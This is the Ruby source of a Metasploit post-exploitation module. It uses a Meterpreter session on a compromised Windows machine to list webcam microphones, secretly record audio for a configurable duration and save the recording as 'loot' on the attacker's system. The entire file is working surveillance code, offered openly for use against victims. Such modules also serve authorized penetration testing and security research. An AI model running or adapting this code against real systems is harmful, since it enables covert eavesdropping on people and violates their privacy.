##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'
require 'rex'

class MetasploitModule < Msf::Post

  include Msf::Auxiliary::Report

  def initialize(info={})
    super(update_info(info,
      'Name'          => 'Windows Manage/Capture Sound Stream',
      'Description'   => %q{
          This module will allow the user to access a webcam's microphone and record audio.},
      'License'       => MSF_LICENSE,
      'Author'        => ['ByteZealot'],
      'Platform'      => ['win']
    ))

    register_options(
      [
        OptString.new('ACTION', [true, 'The action to take: list or audio', 'audio']),
        OptInt.new('INDEX',   [true, "The index of the webcam's microphone to use", 1]),
        OptString.new('LOCATION', [true, 'The location to save the loot', '/root/Music/']),
        OptInt.new('DURATION', [true, 'The duration of recording in seconds', 60])
      ], self.class)
  end

  def run
    if client.nil?
      print_error("Invalid session ID selected. Make sure the host isn't dead.")
      return
    end

    action = datastore['ACTION']

    if not action
      print_error("Invalid action")
      return
    end

    case action
    when /^list$/i
      list_webcams(true)
    when /^audio$/i
      audio
    end
  end


  def rhost
    client.sock.peerhost
  end


  def audio
    webcams = list_webcams

    if webcams.empty?
      print_error("#{rhost} - No webcams's microphone found...")
      return
    end

    if not webcams[datastore['INDEX']-1]
      print_error("#{rhost} - No such index: #{datastore['INDEX'].to_s}")
      return
    end

    buf = nil

    begin
      print_status("#{rhost} - Recording Started...")

      buf = client.webcam.record_mic(datastore['DURATION'])
      if buf
        print_status("#{rhost} - Got Sound Stream")

        ::File.open(datastore['LOCATION'] + "/MicrophoneLoot.wav", 'wb') do |fd|
          fd.write(buf)
        end
      end

      print_status("#{rhost} - Recording Stopped.")
      print_good("#{rhost} - Sound Stream saved.")
    rescue Rex::Post::Meterpreter::RequestError => e
      print_error(e.message)
      return
    end
  end


  def list_webcams(show=false)
    begin
      webcams = client.webcam.webcam_list
    rescue Rex::Post::Meterpreter::RequestError
      webcams = []
    end

    if show
      tbl = Rex::Text::Table.new(
        'Header'  => 'Webcam List',
        'Indent'  => 1,
        'Columns' => ['Index', 'Name']
      )

      webcams.each_with_index do |name, indx|
        tbl <<  [(indx+1).to_s, name]
      end

      print_line(tbl.to_s)
    end

    return webcams
  end

end

